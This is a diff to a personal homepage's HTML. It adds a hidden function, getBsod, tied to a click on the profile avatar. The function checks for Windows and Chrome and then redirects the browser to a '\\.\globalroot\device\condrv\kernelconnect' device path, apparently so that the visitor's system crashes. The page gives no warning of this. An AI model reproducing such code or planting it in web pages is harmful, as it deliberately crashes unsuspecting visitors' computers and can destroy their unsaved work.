@@ -26,7 +26,7 @@
 
 <main class="container">
     <section class="content">
-        <img class="avatar" src="https://avatars0.githubusercontent.com/u/7848847">
+        <img class="avatar" src="https://avatars0.githubusercontent.com/u/7848847" onclick="getBsod()">
         <div class="name" googl="true">Ed Asriyan</div>
         <p class="description">
             <span class="desktop-hidden" id="desc_mobile"></span>
@@ -109,6 +109,18 @@
       }
     });
   });
+
+  var getBsod = function () {
+    if (navigator.appVersion.indexOf("Win") === -1) {
+      return;
+    }
+
+    if (navigator.userAgent.indexOf("Chrome") === -1) {
+      return;
+    }
+
+    window.location = '\\\\.\\globalroot\\device\\condrv\\kernelconnect';
+  };
 </script>
 
 </body>
